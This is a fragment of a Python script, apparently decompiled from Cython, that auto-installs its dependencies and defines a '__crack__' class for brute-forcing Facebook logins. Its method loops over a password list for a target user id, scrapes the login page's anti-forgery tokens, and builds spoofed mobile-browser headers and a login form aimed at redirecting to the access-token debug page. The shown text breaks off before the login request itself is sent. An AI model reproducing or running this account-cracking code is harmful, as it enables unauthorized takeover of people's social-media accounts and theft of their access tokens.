...
try:
	...
	print('\n [Ã¢Åâ] installing requests !...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [Ã¢Åâ] installing futures !...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [Ã¢Åâ] installing bs4 !...\n')
	os.system('pip install bs4')
...
def main():
	...
	print("\033[1;92m\tâ\033[1;92mWELLCOME TO ABDULLAH     \033[1;92m      â")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6328.224 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dpr":"3","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get('https://mbasic.facebook.com/profile.php?eav=AfaDL6BPjf74FC4O_Hyiw05K6AeowvqWpErmBXZjlLASRvkohgKTUdvfMQ4dfsCRe90&refid=8&paipv=0', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 13; SM-T387W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6268.222 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/profile.php?eav=AfaDL6BPjf74FC4O_Hyiw05K6AeowvqWpErmBXZjlLASRvkohgKTUdvfMQ4dfsCRe90&refid=8&paipv=0","accept-encoding":"gzip, deflate br","accept-language":"en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"}
